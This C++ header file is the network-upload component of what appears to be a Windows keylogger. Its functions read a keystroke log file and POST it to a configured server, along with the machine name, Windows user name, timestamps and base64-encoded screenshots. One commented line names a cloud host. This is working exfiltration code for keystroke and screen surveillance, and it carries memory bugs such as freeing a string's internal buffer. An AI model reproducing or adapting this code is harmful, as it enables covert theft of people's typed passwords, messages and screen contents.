#ifndef HTTPPOST_H_INCLUDED
#define HTTPPOST_H_INCLUDED

#include <string>
#include <sstream>
#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <stdint.h>
#include <iostream>
#include "config.h"
#include "picosha2.h"


using namespace std;

namespace HTTPPost
{
    int SendHTTPRequestHandler(const std::string &content, const std::string &posturl);

    bool SendHTTPRequest( const std::string &g)
    {
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
            return 0;

        SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (fd < 0)     throw;
        cout << "Socket CONFIGURED" << endl;
        SOCKADDR_IN service;
        service.sin_family = AF_INET;
        service.sin_port = htons(80);
        cout << "PORT OPENED" << endl;
        LPHOSTENT host = gethostbyname(CONFIG_DICT["SERVER_HOST"].c_str());
        //cout << "HOST GET 1 " << gethostbyname("security-application-env.mk7eyi7r2p.ap-southeast-1.elasticbeanstalk.com") << endl;
        //cout << "HOST GET " << host << endl;
        if (!host)          throw;
        cout << "HOST OPENED" << endl;
        service.sin_addr = *((LPIN_ADDR)*host->h_addr_list);
        if (connect(fd, (SOCKADDR *)&service, sizeof(service)) < 0)     throw;
        cout << "OPENING FILE" << endl;
        FILE *f = fopen(g.c_str(), "r");
        cout << "OPENED FILE " << f << endl;
        if (!f)         throw;
        cout << "FILE OPENED" << endl;
        uint32_t len = 0;
        fseek(f, 0x00, SEEK_END);
        len = ftell(f);
        fseek(f, 0x00, SEEK_SET);
        char header[1024];
        char *buffer = new char[len];
        fread(buffer, sizeof(char), len, f);
        std::string headerContainer = std::string("POST /api-auth/post/ HTTP/1.1\r\n") + "Host: " + CONFIG_DICT["SERVER_HOST"] + "\r\n" + "Connection: keep-alive\r\n" + "User-Agent: Mozilla Firefox/4.0\r\n" + "User-Agent: Mozilla Firefox/4.0\r\n" +"Content-Length: %d\r\n"+ "Content-Type: application/x-www-form-urlencoded\r\n"+"Accept-Charset: utf-8\r\n\r\n";
        sprintf(header, headerContainer.c_str(), len+11);
        /*sprintf(header,
                "POST /api-auth/post/ HTTP/1.1\r\n"
                "Host: " <<
                CONFIG_DICT["SERVER_HOST"] <<
                 "\r\n"
                "Connection: keep-alive\r\n"
                "User-Agent: Mozilla Firefox/4.0\r\n"
                "Content-Length: %d\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Accept-Charset: utf-8\r\n\r\n",
                len+11);*/
        std::cout << header << std::endl;
        std::cout << buffer << std::endl;
        send(fd, header, strlen(header), 0);
        send(fd, "keylogData=", 11, 0);
        send(fd, buffer, strlen(buffer), 0);
        //send(fd, "&userMachine=JW Machine", 24, 0);
        send(fd, "\r\n", 2, 0);

         //get response
        int BUFFERSIZE = 4096;
        char MESSAGE[200];
        std::string response = "";
        int resp_leng = BUFFERSIZE;
        while (resp_leng == BUFFERSIZE)
        {
            resp_leng= recv(fd, MESSAGE, sizeof(MESSAGE), 0);
            if (resp_leng>0)
                response+= std::string(MESSAGE).substr(0,resp_leng);
            //note: download lag is not handled in this code
        }



        //display response
        cout << "Response: " << response << endl;

        delete [] buffer;
        fprintf(stderr, "Done\n");
        closesocket(fd);
        WSACleanup();

        //check if its 201
        std::size_t found = response.find("201 Created");
        if(found!=std::string::npos){
            return 201;
        } else {
            return 0;
        }


    }

    bool SendHTTPRequestByString( const std::string &g)
    {
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
            return 0;

        SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (fd < 0)     throw;
        cout << "Socket CONFIGURED" << endl;
        SOCKADDR_IN service;
        service.sin_family = AF_INET;
        service.sin_port = htons(80);
        cout << "PORT OPENED" << endl;
        LPHOSTENT host = gethostbyname(CONFIG_DICT["SERVER_HOST"].c_str());
        //cout << "HOST GET 1 " << gethostbyname("security-application-env.mk7eyi7r2p.ap-southeast-1.elasticbeanstalk.com") << endl;
        //cout << "HOST GET " << host << endl;
        if (!host)          throw;
        cout << "HOST OPENED" << endl;
        service.sin_addr = *((LPIN_ADDR)*host->h_addr_list);
        if (connect(fd, (SOCKADDR *)&service, sizeof(service)) < 0)     throw;
        uint32_t len = strlen(g.c_str());

        char header[1024];
        const char *buffer = new char[len];
        buffer = g.c_str();

        std::string headerContainer = std::string("POST /api-auth/post/ HTTP/1.1\r\n") + "Host: " + CONFIG_DICT["SERVER_HOST"] + "\r\n" + "Connection: keep-alive\r\n" + "User-Agent: Mozilla Firefox/4.0\r\n" + "User-Agent: Mozilla Firefox/4.0\r\n" +"Content-Length: %d\r\n"+ "Content-Type: application/x-www-form-urlencoded\r\n"+"Accept-Charset: utf-8\r\n\r\n";
        sprintf(header, headerContainer.c_str(), len+8);
        /*sprintf(header,
                "POST /api-auth/post/ HTTP/1.1\r\n"
                "Host: " <<
                CONFIG_DICT["SERVER_HOST"] <<
                 "\r\n"
                "Connection: keep-alive\r\n"
                "User-Agent: Mozilla Firefox/4.0\r\n"
                "Content-Length: %d\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Accept-Charset: utf-8\r\n\r\n",
                len+11);*/
        std::cout << header << std::endl;
        std::cout << buffer << std::endl;
        send(fd, header, strlen(header), 0);
        send(fd, "logTime=", 8, 0);
        send(fd, buffer, strlen(buffer), 0);
        //send(fd, "&userMachine=JW Machine", 24, 0);
        send(fd, "\r\n", 2, 0);

         //get response
        int BUFFERSIZE = 4096;
        char MESSAGE[200];
        std::string response = "";
        int resp_leng = BUFFERSIZE;
        while (resp_leng == BUFFERSIZE)
        {
            resp_leng= recv(fd, MESSAGE, sizeof(MESSAGE), 0);
            if (resp_leng>0)
                response+= string(MESSAGE).substr(0,resp_leng);
            //note: download lag is not handled in this code
        }



        //display response
        cout << "Response: " << response << endl;

        delete [] buffer;
        fprintf(stderr, "Done\n");
        closesocket(fd);
        WSACleanup();

        //check if its 201
        std::size_t found = response.find("201 Created");
        if(found!=std::string::npos){
            return 201;
        } else {
            return 0;
        }


    }


    int SendKeylogData(const std::string &g)
    {
        FILE *f = fopen(g.c_str(), "r");
        cout << "OPENED FILE " << f << endl;
        if (!f)         throw;
        cout << "FILE OPENED" << endl;
        uint32_t len = 0;
        fseek(f, 0x00, SEEK_END);
        len = ftell(f);
        fseek(f, 0x00, SEEK_SET);
        char header[1024];
        char *buffer = new char[len];
        fread(buffer, sizeof(char), len, f);

        std::string s(buffer, len); //need ,len or else there will be a weird character (no null terminator)
        //construct the body content - need hash password?
        std::string content = "";
        content =   "user=" + CONFIG_DICT["USER_NAME"] +
                    "&password=" + picosha2::hash256_hex_string(CONFIG_DICT["PASSWORD"]) +
                    "&com_name=" + Helper::ToString(getenv("COMPUTERNAME")) +
                    "&com_user=" + Helper::ToString(getenv("USERNAME")) +
                    "&com_time=" + Helper::DateTime().GetDateTimeString() +
                    "&keylog_data=" + s;
        std::string postURL = CONFIG_DICT["API_DATA"];
        SendHTTPRequestHandler(content, postURL);
    }

    int SendHostLog()
    {
        //construct the body content - need hash password?
        std::string content = "";
        content =   "user=" + CONFIG_DICT["USER_NAME"] +
                    "&password=" + picosha2::hash256_hex_string(CONFIG_DICT["PASSWORD"]) +
                    "&com_name=" + Helper::ToString(getenv("COMPUTERNAME")) +
                    "&com_user=" + Helper::ToString(getenv("USERNAME")) +
                    "&com_time=" + Helper::DateTime().GetDateTimeString();
        std::string postURL = CONFIG_DICT["API_HOST_LOG"];
        return SendHTTPRequestHandler(content, postURL);
    }

    int SendImage(std::string base64image)
    {
        //construct the body content - need hash password?
        std::string content = "";
        content =   "user=" + CONFIG_DICT["USER_NAME"] +
                    "&password=" + picosha2::hash256_hex_string(CONFIG_DICT["PASSWORD"]) +
                    "&com_name=" + Helper::ToString(getenv("COMPUTERNAME")) +
                    "&com_user=" + Helper::ToString(getenv("USERNAME")) +
                    "&com_time=" + Helper::DateTime().GetDateTimeString() +
                    "&image_data=" + base64image;
        std::string postURL = CONFIG_DICT["API_HOST_IMAGE"];
        return SendHTTPRequestHandler(content, postURL);
    }

    int SendHTTPRequestHandler(const std::string &content, const std::string &posturl)
    {
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
            return 0;

        SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (fd < 0)     throw;
        //cout << "Socket CONFIGURED" << endl;
        SOCKADDR_IN service;
        service.sin_family = AF_INET;
        service.sin_port = htons(80);
        //cout << "PORT OPENED" << endl;
        LPHOSTENT host = gethostbyname(CONFIG_DICT["SERVER_HOST"].c_str());
        //cout << "HOST GET 1 " << gethostbyname("security-application-env.mk7eyi7r2p.ap-southeast-1.elasticbeanstalk.com") << endl;
        //cout << "HOST GET " << host << endl;
        if (!host)          throw;
        //cout << "HOST OPENED" << endl;
        service.sin_addr = *((LPIN_ADDR)*host->h_addr_list);
        if (connect(fd, (SOCKADDR *)&service, sizeof(service)) < 0)     throw;
        uint32_t len = strlen(content.c_str());

        char header[1024];
        const char *buffer = new char[len];
        buffer = content.c_str();
        //cout << "POST URL " << posturl << endl;
        std::string headerContainer = std::string("POST ") + posturl + " HTTP/1.1\r\n" + "Host: " + CONFIG_DICT["SERVER_HOST"] + "\r\n" + "Connection: keep-alive\r\n" + "User-Agent: Mozilla Firefox/4.0\r\n" +"Content-Length: %d\r\n"+ "Content-Type: application/x-www-form-urlencoded\r\n"+"Accept-Charset: utf-8\r\n\r\n";
        sprintf(header, headerContainer.c_str(), len);
        /*sprintf(header,
                "POST /api-auth/post/ HTTP/1.1\r\n"
                "Host: " <<
                CONFIG_DICT["SERVER_HOST"] <<
                 "\r\n"
                "Connection: keep-alive\r\n"
                "User-Agent: Mozilla Firefox/4.0\r\n"
                "Content-Length: %d\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Accept-Charset: utf-8\r\n\r\n",
                len+11);*/
        //std::cout << header << std::endl;
        //std::cout << buffer << std::endl;
        send(fd, header, strlen(header), 0);
        send(fd, buffer, strlen(buffer), 0);
        send(fd, "\r\n", 2, 0);

         //get response
        int BUFFERSIZE = 4096;
        char MESSAGE[200];
        std::string response = "";
        int resp_leng = BUFFERSIZE;
        while (resp_leng == BUFFERSIZE)
        {
            resp_leng= recv(fd, MESSAGE, sizeof(MESSAGE), 0);
            if (resp_leng>0)
                response+= string(MESSAGE).substr(0,resp_leng);
            //note: download lag is not handled in this code
        }



        //display response
        //cout << "Response: " << response << endl;

        delete [] buffer;
        fprintf(stderr, "Done\n");
        closesocket(fd);
        WSACleanup();

        //check if its 201
        std::size_t found = response.find("201 Created");
        if(found!=std::string::npos){
            return 201;
        } else {
            return 0;
        }
    }
}


#endif // HTTPPOST_H_INCLUDED
